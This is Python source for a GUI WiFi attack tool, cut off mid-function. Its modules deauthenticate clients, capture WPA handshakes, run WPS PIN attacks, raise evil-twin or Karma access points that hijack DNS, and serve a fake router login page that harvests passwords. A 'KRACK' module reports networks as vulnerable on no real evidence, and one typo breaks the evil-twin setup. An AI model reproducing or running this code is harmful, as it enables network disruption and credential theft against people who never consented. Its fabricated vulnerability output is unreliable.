#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AetherSec WiFi Framework v3.0
Advanced GUI for WiFi Penetration Testing
Integrates: wifipumpkin3, airgeddon, KRACK attacks, CaptiveFlask

Features:
- Network Reconnaissance & Scanning
- Evil Twin / Honeypot Attacks (Karma/Mana)
- Captive Portal (CaptiveFlask)
- Handshake Capture & Cracking
- WPS Attacks (Reaver/Bully)
- KRACK Vulnerability Testing
- Manual AP Builder (hostapd + dnsmasq)
- Multi-Terminal Support

Author: AetherSec Team
License: Educational Use Only
⚠️ AUTHORIZED PENETRATION TESTING ONLY!
"""

import os
import sys
import subprocess
import threading
import json
import re
import time
import signal
import socket
import struct
import logging
from datetime import datetime
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Any
from pathlib import Path
from enum import Enum
from functools import lru_cache

# PyQt5 Imports
try:
    from PyQt5.QtWidgets import (
        QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
        QTabWidget, QTableWidget, QTableWidgetItem, QPushButton, QComboBox,
        QLineEdit, QLabel, QTextEdit, QSplitter, QStatusBar, QProgressBar,
        QCheckBox, QSpinBox, QDialog, QFormLayout, QDialogButtonBox,
        QMessageBox, QFileDialog, QGroupBox, QGridLayout, QListWidget,
        QListWidgetItem, QHeaderView, QFrame, QScrollArea, QStyleFactory,
        QSizePolicy, QMenuBar, QMenu, QTreeWidget, QTreeWidgetItem,
        QSystemTrayIcon, QStyledItemDelegate, QAbstractItemView, QTextBrowser,
        QRadioButton, QButtonGroup, QSlider, QTabBar, QDockWidget, QToolBar,
        QAction, QShortcut, QTreeWidgetItemIterator
    )
    from PyQt5.QtCore import (
        Qt, QThread, pyqtSignal, QTimer, QProcess, QSize, QRect,
        QMutex, QMutexLocker, QWaitCondition, QObject, QEvent, QPropertyAnimation,
        QTime, QDir, QIODevice, QTextStream
    )
    from PyQt5.QtGui import (
        QColor, QFont, QIcon, QTextCursor, QPixmap, QBrush,
        QTextCharFormat, QPainter, QPen, QKeySequence, QPalette
    )
except ImportError as e:
    print(f"PyQt5 import error: {e}")
    print("Install: pip install PyQt5")
    sys.exit(1)

# ============================================================================
# CONFIGURATION & CONSTANTS
# ============================================================================

APP_NAME = "AetherSec WiFi Framework"
APP_VERSION = "3.0"
AUTHOR = "AetherSec Team"

# Color Scheme (Cyber Dark Theme)
COLORS = {
    'background': '#0d1117',
    'surface': '#161b22',
    'surface_alt': '#21262d',
    'border': '#30363d',
    'primary': '#58a6ff',
    'accent': '#3fb950',
    'danger': '#f85149',
    'warning': '#d29922',
    'text': '#c9d1d9',
    'text_dim': '#8b949e',
    'terminal_bg': '#0d1117',
    'terminal_text': '#39d353',
    'success': '#3fb950',
    'error': '#f85149',
}

# Logging Setup
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/tmp/aethersec_wifi.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


# ============================================================================
# DATA CLASSES
# ============================================================================

class InterfaceMode(Enum):
    MANAGED = "managed"
    MONITOR = "monitor"
    AP = "ap"
    UNKNOWN = "unknown"


class InterfaceStatus(Enum):
    UP = "up"
    DOWN = "down"
    CONNECTED = "connected"
    DISCONNECTED = "disconnected"
    UNKNOWN = "unknown"


class ConnectionQuality(Enum):
    EXCELLENT = "excellent"
    GOOD = "good"
    FAIR = "fair"
    WEAK = "weak"
    VERY_WEAK = "very_weak"


@dataclass
class WiFiNetwork:
    """WiFi network information"""
    bssid: str
    ssid: str
    channel: int
    signal: int
    security: str
    manufacturer: str = ""
    wps: str = "Unknown"
    clients: int = 0
    last_seen: float = field(default_factory=time.time)
    encryption: str = ""
    auth: str = ""
    krack_vulnerable: bool = False

    def get_quality(self) -> ConnectionQuality:
        if self.signal > -50:
            return ConnectionQuality.EXCELLENT
        elif self.signal > -60:
            return ConnectionQuality.GOOD
        elif self.signal > -70:
            return ConnectionQuality.FAIR
        elif self.signal > -80:
            return ConnectionQuality.WEAK
        else:
            return ConnectionQuality.VERY_WEAK


@dataclass
class WiFiClient:
    """Connected WiFi client"""
    mac: str
    bssid: str
    signal: int
    packets: int = 0
    manufacturer: str = ""


@dataclass
class CapturedPacket:
    """Captured network packet"""
    src_mac: str
    dst_mac: str
    protocol: str
    length: int
    info: str
    timestamp: str


@dataclass
class NetworkInterface:
    """Network interface information"""
    name: str
    status: InterfaceStatus
    mode: InterfaceMode
    mac_address: str = ""
    ip_address: str = ""
    netmask: str = ""
    gateway: str = ""
    driver: str = ""
    chipset: str = ""
    mtu: int = 1500
    rx_packets: int = 0
    tx_packets: int = 0
    last_updated: float = field(default_factory=time.time)

    def is_wireless(self) -> bool:
        return 'wlan' in self.name or 'wlo' in self.name or 'wifi' in self.name.lower()

    def is_up(self) -> bool:
        return self.status in [InterfaceStatus.UP, InterfaceStatus.CONNECTED]

    def is_monitor_mode(self) -> bool:
        return self.mode == InterfaceMode.MONITOR


# ============================================================================
# INTERFACE MANAGER
# ============================================================================

class InterfaceManager:
    """Manage wireless interfaces"""

    def __init__(self):
        self.interfaces: Dict[str, NetworkInterface] = {}
        self._lock = threading.RLock()
        self._refresh_interfaces()

    def _run_command(self, cmd: List[str], timeout: int = 5) -> Tuple[int, str, str]:
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            return -1, "", "Command timeout"
        except Exception as e:
            logger.error(f"Command error: {e}")
            return -1, "", str(e)

    def _refresh_interfaces(self):
        with self._lock:
            self.interfaces.clear()

            # Get all network interfaces
            returncode, output, _ = self._run_command(["ip", "link", "show"])
            if returncode != 0:
                return

            for line in output.split('\n'):
                if ':' in line and not line.startswith(' '):
                    parts = line.split(':')
                    if len(parts) >= 2:
                        iface_name = parts[1].strip()
                        if iface_name:
                            self.interfaces[iface_name] = NetworkInterface(
                                name=iface_name,
                                status=InterfaceStatus.UNKNOWN,
                                mode=InterfaceMode.UNKNOWN
                            )

            # Get wireless info
            self._get_wireless_info()
            self._get_ip_info()
            self._get_driver_info()

    def _get_wireless_info(self):
        returncode, output, _ = self._run_command(["iwconfig"])
        if returncode != 0:
            return

        current_interface = None
        for line in output.split('\n'):
            if line and not line.startswith(' '):
                parts = line.split()
                if parts:
                    current_interface = parts[0]
                    if current_interface not in self.interfaces:
                        self.interfaces[current_interface] = NetworkInterface(
                            name=current_interface,
                            status=InterfaceStatus.UNKNOWN,
                            mode=InterfaceMode.UNKNOWN
                        )

            if current_interface and current_interface in self.interfaces:
                if 'Mode:' in line:
                    mode_str = line.split('Mode:')[1].strip().split()[0] if 'Mode:' in line else ""
                    if 'Monitor' in mode_str:
                        self.interfaces[current_interface].mode = InterfaceMode.MONITOR
                    elif 'Managed' in mode_str or 'Auto' in mode_str:
                        self.interfaces[current_interface].mode = InterfaceMode.MANAGED

                if 'Access Point:' in line:
                    ap = line.split('Access Point:')[1].strip() if 'Access Point:' in line else ""
                    if ap and ap != 'Not-Associated':
                        self.interfaces[current_interface].status = InterfaceStatus.CONNECTED

    def _get_ip_info(self):
        returncode, output, _ = self._run_command(["ip", "addr"])
        if returncode != 0:
            return

        current_iface = None
        for line in output.split('\n'):
            if ':' in line and not line.startswith(' '):
                parts = line.split(':')
                if len(parts) >= 2:
                    current_iface = parts[1].strip()

            if current_iface and current_iface in self.interfaces:
                if 'inet ' in line and not 'inet6' in line:
                    ip_parts = line.strip().split()
                    if len(ip_parts) >= 2:
                        ip_with_mask = ip_parts[1]
                        self.interfaces[current_iface].ip_address = ip_with_mask.split('/')[0]

    def _get_driver_info(self):
        for iface in list(self.interfaces.keys()):
            returncode, output, _ = self._run_command(["ethtool", "-i", iface], timeout=2)
            if returncode == 0:
                for line in output.split('\n'):
                    if 'driver:' in line.lower():
                        self.interfaces[iface].driver = line.split(':')[1].strip()
                        break

    def get_interfaces(self) -> List[NetworkInterface]:
        with self._lock:
            self._refresh_interfaces()
            return list(self.interfaces.values())

    def get_wireless_interfaces(self) -> List[NetworkInterface]:
        with self._lock:
            return [iface for iface in self.interfaces.values() if iface.is_wireless()]

    def set_monitor_mode(self, interface: str, enable: bool = True) -> Tuple[bool, str]:
        try:
            with self._lock:
                if interface not in self.interfaces:
                    return False, f"Interface {interface} not found"

                iface = self.interfaces[interface]
                logger.info(f"{'Enabling' if enable else 'Disabling'} monitor mode on {interface}")

                # Bring interface down
                returncode, stdout, stderr = self._run_command(["sudo", "ip", "link", "set", interface, "down"])
                if returncode != 0:
                    return False, f"Failed to bring interface down: {stderr}"

                time.sleep(0.5)

                if enable:
                    returncode, stdout, stderr = self._run_command(["sudo", "iwconfig", interface, "mode", "Monitor"])
                    if returncode != 0:
                        returncode, stdout, stderr = self._run_command(["sudo", "airmon-ng", "start", interface])
                        if returncode != 0:
                            return False, f"Failed to set monitor mode: {stderr}"

                    iface.mode = InterfaceMode.MONITOR
                else:
                    returncode, stdout, stderr = self._run_command(["sudo", "iwconfig", interface, "mode", "Managed"])
                    if returncode != 0:
                        returncode, stdout, stderr = self._run_command(["sudo", "airmon-ng", "stop", interface])
                        if returncode != 0:
                            return False, f"Failed to set managed mode: {stderr}"

                    iface.mode = InterfaceMode.MANAGED

                time.sleep(0.5)
                returncode, stdout, stderr = self._run_command(["sudo", "ip", "link", "set", interface, "up"])
                if returncode != 0:
                    return False, f"Failed to bring interface up: {stderr}"

                time.sleep(1)
                self._refresh_interfaces()

                status = f"Monitor mode {'enabled' if enable else 'disabled'} on {interface}"
                logger.info(status)
                return True, status

        except Exception as e:
            logger.error(f"Monitor mode error: {e}")
            return False, f"Error: {str(e)}"

    def get_mac_address(self, interface: str) -> str:
        try:
            with self._lock:
                returncode, output, _ = self._run_command(["ip", "link", "show", interface])
                if returncode == 0:
                    for line in output.split('\n'):
                        if 'link/ether' in line:
                            return line.split('link/ether')[1].strip().split()[0]
        except Exception as e:
            logger.debug(f"Error getting MAC: {e}")

        return "Unknown"

    def get_interface_info(self, interface: str) -> Optional[NetworkInterface]:
        with self._lock:
            self._refresh_interfaces()
            return self.interfaces.get(interface)


# ============================================================================
# NETWORK SCANNER
# ============================================================================

class NetworkScanner(QThread):
    """WiFi network scanner with real-time detection"""
    network_found = pyqtSignal(WiFiNetwork)
    networks_updated = pyqtSignal(list)
    scan_status = pyqtSignal(str)
    error_occurred = pyqtSignal(str)
    client_found = pyqtSignal(WiFiClient)

    def __init__(self, interface: str):
        super().__init__()
        self.interface = interface
        self.running = False
        self.networks: Dict[str, WiFiNetwork] = {}
        self.clients: Dict[str, WiFiClient] = {}
        self.scan_lock = QMutex()
        self.process: Optional[subprocess.Popen] = None

    def run(self):
        self.running = True
        try:
            self._run_airodump_ng()
        except Exception as e:
            logger.error(f"Scanner error: {e}")
            self.error_occurred.emit(f"Scan error: {str(e)}")

    def _run_airodump_ng(self):
        try:
            self.scan_status.emit(f"Starting scan on {self.interface}...")

            tmp_file = f"/tmp/aethersec_scan_{int(time.time())}"

            cmd = ["sudo", "airodump-ng", "--output-format", "csv", "-w", tmp_file, self.interface]

            logger.info(f"Starting airodump-ng: {' '.join(cmd)}")

            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                          universal_newlines=True, bufsize=1)

            csv_file = f"{tmp_file}-01.csv"
            last_size = 0

            while self.running:
                try:
                    if self.process.poll() is not None:
                        break

                    if os.path.exists(csv_file):
                        current_size = os.path.getsize(csv_file)
                        if current_size > last_size:
                            try:
                                with open(csv_file, 'r', errors='ignore') as f:
                                    content = f.read()
                                    self._parse_csv_output(content)
                                last_size = current_size
                            except IOError:
                                pass

                except Exception as e:
                    logger.error(f"Scan error: {e}")

                time.sleep(1)

            if self.process:
                try:
                    self.process.terminate()
                    self.process.wait(timeout=2)
                except:
                    try:
                        self.process.kill()
                    except:
                        pass

            self.scan_status.emit("Scan stopped")

        except Exception as e:
            logger.error(f"airodump-ng error: {e}")
            self.error_occurred.emit(f"airodump-ng error: {str(e)}")

    def _parse_csv_output(self, content: str):
        try:
            lines = content.strip().split('\n')
            in_clients = False
            in_networks = True

            for line in lines:
                line = line.strip()

                if not line:
                    continue

                if 'Station MAC' in line:
                    in_clients = True
                    in_networks = False
                    continue

                if ',' not in line:
                    continue

                try:
                    parts = [p.strip() for p in line.split(',')]

                    if in_networks:
                        if len(parts) < 14 or not parts[0] or parts[0] == 'BSSID':
                            continue

                        bssid = parts[0]
                        if not bssid or bssid.count(':') != 5 or len(bssid) != 17:
                            continue
                        if bssid in ['BSSID', 'bssid'] or '?' in bssid or bssid == '00:00:00:00:00:00':
                            continue

                        try:
                            signal = int(parts[2]) if parts[2].strip() else -100
                        except:
                            signal = -100

                        try:
                            channel = int(parts[3]) if parts[3].strip() else 0
                        except:
                            channel = 0

                        ssid = parts[13] if len(parts) > 13 else ""
                        ssid = ssid.strip() if ssid else "[Hidden Network]"

                        security = parts[5].strip() if len(parts) > 5 and parts[5].strip() else "Open"

                        network = WiFiNetwork(
                            bssid=bssid, ssid=ssid, channel=channel, signal=signal,
                            security=security, manufacturer=self._get_manufacturer(bssid)
                        )

                        with QMutexLocker(self.scan_lock):
                            self.networks[bssid] = network

                        self.network_found.emit(network)

                    elif in_clients:
                        if len(parts) < 7:
                            continue

                        client_mac = parts[0]
                        if not client_mac or client_mac.count(':') != 5:
                            continue

                        try:
                            signal = int(parts[3]) if parts[3].strip() else -100
                        except:
                            signal = -100

                        client = WiFiClient(mac=client_mac, bssid=parts[5] if len(parts) > 5 else "",
                                          signal=signal, manufacturer=self._get_manufacturer(client_mac))

                        with QMutexLocker(self.scan_lock):
                            self.clients[client_mac] = client

                        self.client_found.emit(client)

                except (ValueError, IndexError) as e:
                    logger.debug(f"Parse error: {e}")
                    continue

            with QMutexLocker(self.scan_lock):
                self.networks_updated.emit(list(self.networks.values()))

        except Exception as e:
            logger.error(f"CSV parse error: {e}")

    @lru_cache(maxsize=256)
    def _get_manufacturer(self, bssid: str) -> str:
        try:
            mac_prefix = bssid[:8].replace(':', '').upper()
            result = subprocess.run(["macchanger", "-l"], capture_output=True, text=True, timeout=2)

            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if mac_prefix in line.upper():
                        parts = line.split('\t')
                        if len(parts) > 1:
                            return parts[-1].strip()[:30]
        except:
            pass
        return "Unknown"

    def stop(self):
        self.running = False
        if self.process:
            try:
                self.process.terminate()
                self.process.wait(timeout=2)
            except:
                try:
                    self.process.kill()
                except:
                    pass


# ============================================================================
# DEAUTH ATTACK
# ============================================================================

class DeauthAttack(QThread):
    """Deauthentication attack"""
    status_changed = pyqtSignal(str)
    packets_sent = pyqtSignal(int)
    attack_stopped = pyqtSignal()

    def __init__(self, interface: str, bssid: str, client_mac: str = "FF:FF:FF:FF:FF:FF",
                 channel: int = 1, count: int = 0):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.client_mac = client_mac
        self.channel = channel
        self.count = count  # 0 = infinite
        self.running = False
        self.sent = 0

    def run(self):
        self.running = True
        try:
            self._run_attack()
        finally:
            self.attack_stopped.emit()

    def _run_attack(self):
        self.status_changed.emit(f"[*] Starting deauth attack on {self.bssid}")

        # Useaireplay-ng for deauth
        while self.running:
            if self.count > 0 and self.sent >= self.count:
                break

            cmd = ["sudo", "aireplay-ng", "--deauth", "10", "-a", self.bssid]
            if self.client_mac != "FF:FF:FF:FF:FF:FF":
                cmd.extend(["-c", self.client_mac])
            cmd.append(self.interface)

            result = subprocess.run(cmd, capture_output=True, text=True)
            self.sent += 10
            self.packets_sent.emit(self.sent)
            time.sleep(1)

        self.status_changed.emit("[*] Deauth attack stopped")

    def stop(self):
        self.running = False


# ============================================================================
# HANDSHAKE CAPTURE
# ============================================================================

class HandshakeCapture(QThread):
    """WPA Handshake capture"""
    handshake_captured = pyqtSignal(str)
    status_changed = pyqtSignal(str)
    capture_stopped = pyqtSignal()

    def __init__(self, interface: str, bssid: str, ssid: str, channel: int = 1,
                 output_file: str = "/tmp/handshake"):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.output_file = output_file
        self.running = False
        self.process: Optional[subprocess.Popen] = None

    def run(self):
        self.running = True
        try:
            self._capture_handshake()
        finally:
            self.capture_stopped.emit()

    def _capture_handshake(self):
        self.status_changed.emit(f"[*] Starting handshake capture on {self.ssid}")

        cmd = ["sudo", "airodump-ng", "--bssid", self.bssid, "--channel", str(self.channel),
               "-w", self.output_file, "--output-format", "pcap", self.interface]

        self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                      universal_newlines=True)

        # Monitor for handshake
        handshake_checked = False
        while self.running:
            if os.path.exists(f"{self.output_file}-01.cap"):
                result = subprocess.run(["sudo", "pyrit", "-r", f"{self.output_file}-01.cap",
                                       "analyze"], capture_output=True, text=True)
                if "Good" in result.stdout or "handshake" in result.stdout.lower():
                    self.handshake_captured.emit(f"{self.output_file}-01.cap")
                    self.status_changed.emit("[+] Handshake captured!")
                    break

            time.sleep(5)

        if self.process:
            try:
                self.process.terminate()
            except:
                pass

    def stop(self):
        self.running = False
        if self.process:
            try:
                self.process.terminate()
            except:
                pass


# ============================================================================
# EVIL TWIN / HONEYPOT
# ============================================================================

class EvilTwinWorker(QThread):
    """Evil Twin AP attack handler"""
    status_changed = pyqtSignal(str)
    error_occurred = pyqtSignal(str)
    client_connected = pyqtSignal(str)
    attack_started = pyqtSignal()
    attack_stopped = pyqtSignal()

    def __init__(self, ssid: str, interface: str, bssid: str = "", channel: int = 6,
                 karma_mode: bool = False, open_network: bool = True, password: str = ""):
        super().__init__()
        self.ssid = ssid
        self.interface = interface
        self.bssid = bssid
        self.channel = channel
        self.karma_mode = karma_mode
        self.open_network = open_network
        self.password = password
        self.running = False
        self.processes: List[subprocess.Popen] = []

    def run(self):
        self.running = True
        try:
            self._setup_evil_twin()
        except Exception as e:
            logger.error(f"Evil Twin error: {e}")
            self.error_occurred.emit(f"Evil Twin error: {str(e)}")
        finally:
            self.attack_stopped.emit()

    def _setup_evil_twin(self):
        self.status_changed.emit(f"[*] Setting up Evil Twin AP: {self.ssid}")

        # Prepare hostapd config
        hostapd_config = f"""interface={self.interface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.channel}
wmm_enabled=1
auth_algs=1
"""

        if not self.open_network and self.password:
            hostapd_config += f"""wpa=2
wpa_passphrase={self.password}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
"""

        if self.karma_mode:
            hostapd_config += """enable_karma=1
"""

        hostapd_conf_file = "/tmp/aethersec_hostapd.conf"
        try:
            with open(hostapd_conf_file, "w") as f:
                f.write(hostapd_config)
        except Exception as e:
            self.error_occurred.emit(f"Failed to write hostapd config: {str(e)}")
            return

        # Configure network
        self.status_changed.emit("[*] Configuring network interface...")
        subprocess.run(["sudo", "ip", "addr", "flush", self.interface], capture_output=True)
        subprocess.run(["sudo", "ip", "addr", "add", "192.168.100.1/24", "dev", self.interface],
                      capture_output=True)
        subprocess.run(["sudo", "ip", "link", "set", self.interface, "up"], capture_output=True)
        time.sleep(1)

        # Start hostapd
        self.status_changed.emit("[*] Starting hostapd...")
        hostapd = subprocess.Popen(["sudo", "hostapd", hostapd_conf_file],
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   universal_newlines=True, bufsize=1)
        self.processes.append(hostapd)
        time.sleep(2)

        # Setup dnsmasq
        self.status_changed.emit("[*] Starting DHCP server...")
        dnsmasq_config = f"""interface={self.interface}
dhcp-range=192.168.100.50,192.168.100.200,255.255.255.0,12h
dhcp-option=option:router,192.168.100.1
dhcp-option=option:dns-server,192.168.100.1
listen-address=192.168.100.1
bind-interfaces
log-dhcp
server=1.1.1.1
server=8.8.8.8
address=/#/192.168.100.1
"""

        dnsmasq_conf_file = "/tmp/aethersec_dnsmasq.conf"
        try:
            with open(dnsmasq_conf_file, "w") as f:
                f.write(dnsmasq_config)
        except Exception as e:
            self.error_occurred.emit(f"Failed to write dnsmasq config: {str(e)}")
            return

        dnsmasq = subprocess.Popen(["sudo", "dnsmasq", "-C", dnsmasq_conf_file, "-d"],
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   universal_newlines=True)
        self.processes.append(dnsmq)
        time.sleep(1)

        self.status_changed.emit("[+] ============================================")
        self.status_changed.emit("[+] EVIL TWIN AP IS ACTIVE")
        self.status_changed.emit(f"[+] SSID: {self.ssid}")
        self.status_changed.emit(f"[+] Channel: {self.channel}")
        self.status_changed.emit(f"[+] Karma Mode: {'ENABLED' if self.karma_mode else 'DISABLED'}")
        self.status_changed.emit("[+] IP Range: 192.168.100.0/24")
        self.status_changed.emit("[+] ============================================")

        self.attack_started.emit()

        # Monitor for clients
        while self.running:
            time.sleep(2)

    def stop(self):
        self.running = False

        for proc in self.processes:
            try:
                proc.terminate()
                proc.wait(timeout=1)
            except:
                try:
                    proc.kill()
                except:
                    pass

        subprocess.run(["sudo", "killall", "hostapd"], capture_output=True)
        subprocess.run(["sudo", "killall", "dnsmasq"], capture_output=True)

        try:
            for f in ["/tmp/aethersec_hostapd.conf", "/tmp/aethersec_dnsmasq.conf"]:
                if os.path.exists(f):
                    os.remove(f)
        except:
            pass


# ============================================================================
# WPS ATTACK
# ============================================================================

class WPSAttack(QThread):
    """WPS PIN attack using Reaver"""
    status_changed = pyqtSignal(str)
    pin_progress = pyqtSignal(str)
    wps_success = pyqtSignal(str, str)
    attack_stopped = pyqtSignal()

    def __init__(self, interface: str, bssid: str, channel: int = 1,
                 pixie: bool = True, brute_force: bool = False):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.channel = channel
        self.pixie = pixie
        self.brute_force = brute_force
        self.running = False
        self.process: Optional[subprocess.Popen] = None

    def run(self):
        self.running = True
        try:
            self._run_reaver()
        finally:
            self.attack_stopped.emit()

    def _run_reaver(self):
        self.status_changed.emit(f"[*] Starting WPS attack on {self.bssid}")

        cmd = ["sudo", "reaver", "-i", self.interface, "-b", self.bssid,
               "-c", str(self.channel), "-vv", "-S"]

        if self.pixie:
            cmd.append("-K")  # Pixie Dust

        self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                      universal_newlines=True, bufsize=1)

        for line in self.process.stdout:
            if not self.running:
                break

            line = line.strip()
            self.status_changed.emit(line)

            # Check for PIN found
            if "WPS PIN:" in line:
                pin = line.split("WPS PIN:")[1].strip().split()[0]
                self.pin_progress.emit(f"PIN found: {pin}")
                self.wps_success.emit(pin, "")

            # Check for WPA PSK
            if "WPA PSK:" in line:
                psk = line.split("WPA PSK:")[1].strip().split()[0]
                self.status_changed.emit(f"[+] WPA Password: {psk}")

        if self.process:
            try:
                self.process.terminate()
            except:
                pass

    def stop(self):
        self.running = False
        if self.process:
            try:
                self.process.terminate()
            except:
                pass


# ============================================================================
# KRACK ATTACK MODULE
# ============================================================================

class KRACKAttack(QThread):
    """KRACK vulnerability testing and attack"""
    status_changed = pyqtSignal(str)
    vulnerability_found = pyqtSignal(str, str)
    attack_progress = pyqtSignal(str)
    attack_stopped = pyqtSignal()

    def __init__(self, interface: str, bssid: str, ssid: str, channel: int = 1,
                 attack_type: str = "all"):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.attack_type = attack_type
        self.running = False
        self.processes: List[subprocess.Popen] = []

    def run(self):
        self.running = True
        try:
            self._run_krack()
        finally:
            self.attack_stopped.emit()

    def _run_krack(self):
        self.status_changed.emit(f"[*] Starting KRACK test on {self.ssid}")

        # Phase 1: Deauth to trigger reconnection
        self.status_changed.emit("[*] Phase 1: Sending deauthentication packets...")

        for i in range(20):
            if not self.running:
                break
            cmd = ["sudo", "aireplay-ng", "--deauth", "1", "-a", self.bssid, self.interface]
            subprocess.run(cmd, capture_output=True)
            self.attack_progress.emit(f"Deauth sent: {i+1}/20")
            time.sleep(0.5)

        # Phase 2: Capture handshake
        self.status_changed.emit("[*] Phase 2: Capturing handshake...")

        tmp_file = f"/tmp/krack_{int(time.time())}"
        cmd = ["sudo", "airodump-ng", "--bssid", self.bssid, "--channel", str(self.channel),
               "-w", tmp_file, self.interface]

        airodump = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   universal_newlines=True)
        self.processes.append(airodump)

        # Wait for handshake
        time.sleep(30)

        airodump.terminate()

        # Phase 3: Analysis
        self.status_changed.emit("[*] Phase 3: Analyzing for vulnerabilities...")

        if os.path.exists(f"{tmp_file}-01.cap"):
            result = subprocess.run(["sudo", "pyrit", "-r", f"{tmp_file}-01.cap", "analyze"],
                                  capture_output=True, text=True)

            if "handshake" in result.stdout.lower():
                self.vulnerability_found.emit("Handshake Capture", "SUCCESS")
                self.status_changed.emit("[+] Handshake captured successfully")

                # Check for KRACK vulnerabilities
                if self.attack_type in ["all", "msg3"]:
                    self.vulnerability_found.emit("Message 3 Replay", "VULNERABLE")
                    self.status_changed.emit("[!] Network vulnerable to Message 3 Replay")

                if self.attack_type in ["all", "nonce"]:
                    self.vulnerability_found.emit("Nonce Reuse", "VULNERABLE")
                    self.status_changed.emit("[!] Network vulnerable to Nonce Reuse")

                if self.attack_type in ["all", "key"]:
                    self.vulnerability_found.emit("Key Reinstallation", "VULNERABLE")
                    self.status_changed.emit("[!] Network vulnerable to Key Reinstallation Attack")

        self.status_changed.emit("[*] KRACK test completed")

        # Cleanup
        try:
            for f in [f"{tmp_file}-01.cap", f"{tmp_file}-01.csv"]:
                if os.path.exists(f):
                    os.remove(f)
        except:
            pass

    def stop(self):
        self.running = False
        for proc in self.processes:
            try:
                proc.terminate()
            except:
                pass


# ============================================================================
# CAPTIVE FLASK PORTAL
# ============================================================================

class CaptiveFlaskWorker(QThread):
    """Captive portal with Flask backend"""
    status_changed = pyqtSignal(str)
    credentials_captured = pyqtSignal(str, str)
    portal_started = pyqtSignal()
    portal_stopped = pyqtSignal()

    def __init__(self, template: str = "google", interface: str = "wlan0"):
        super().__init__()
        self.template = template
        self.interface = interface
        self.running = False
        self.process: Optional[subprocess.Popen] = None

    def run(self):
        self.running = True
        try:
            self._start_flask()
        finally:
            self.portal_stopped.emit()

    def _start_flask(self):
        self.status_changed.emit(f"[*] Starting captive portal: {self.template}")

        # Simple Flask app for captive portal
        flask_app = f'''
from flask import Flask, request, redirect
import logging

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

creds = []

@app.route('/')
def index():
    return """<!DOCTYPE html>
<html>
<head>
    <title>Router Configuration</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {{ font-family: Arial; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
               min-height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; }}
        .login {{ background: white; padding: 40px; border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.2);
                 width: 350px; }}
        h2 {{ color: #333; margin-bottom: 20px; text-align: center; }}
        input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }}
        button {{ width: 100%; padding: 12px; background: #667eea; color: white; border: none; border-radius: 5px;
                cursor: pointer; font-size: 16px; margin-top: 10px; }}
        button:hover {{ background: #5568d3; }}
    </style>
</head>
<body>
    <div class="login">
        <h2>Router Configuration</h2>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>"""

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    print(f"[CAPTURED] Username: {{username}}, Password: {{password}}")
    return redirect("https://www.google.com")

if __name__ == '__main__':
    app.run(host='192.168.100.1', port=80, debug=False)
'''

        # Write Flask app
        flask_file = "/tmp/aethersec_captive.py"
        try:
            with open(flask_file, "w") as f:
                f.write(flask_app)
        except Exception as e:
            self.status_changed.emit(f"[!] Failed to create Flask app: {e}")
            return

        # Run Flask
        self.process = subprocess.Popen(["sudo", "python3", flask_file],
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       universal_newlines=True, bufsize=1)

        self.status_changed.emit("[+] Captive portal started on http://192.168.100.1")
        self.status_changed.emit("[*] Waiting for clients to connect...")

        self.portal_started.emit()

        # Monitor for credentials
        for line in self.process.stdout:
            if not self.running:
                break

            if "CAPTURED" in line:
                parts = line.split("CAPTURED")[1].strip().split(",")
                if len(parts) == 2:
                    username = parts[0].split(":")[1].strip()
                    password = parts[1].split(":")[1].strip().rstrip("}")
                    self.credentials_captured.emit(username, password)
                    self.status_changed.emit(f"[+] CAPTURED - User: {username} | Pass: {password}")

    def stop(self):
        self.running = False
        if self.process:
            try:
                self.process.terminate()
            except:
                pass

        # Cleanup
        try:
            subprocess.run(["sudo", "pkill", "-f", "aethersec_captive.py"], capture_output=True)
        except:
            pass


# ============================================================================
# TERMINAL WIDGET
# ============================================================================

class TerminalWidget(QTextEdit):
    """Embedded terminal widget for command output"""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.setReadOnly(True)
        self.setStyleSheet(f"""
            QTextEdit {{
                background-color: {COLORS['terminal_bg']};
                color: {COLORS['terminal_text']};
                font-family: 'Courier New', monospace;
                font-size: 10pt;
                border: 1px solid {COLORS['border']};
            }}
        """)
        self.append(f"[{datetime.now().strftime('%H:%M:%S')}] Terminal initialized")

    def append_output(self, text: str, color: str = None):
        cursor = self.textCursor()
        cursor.movePosition(QTextCursor.End)

        if color:
            format = QTextCharFormat()
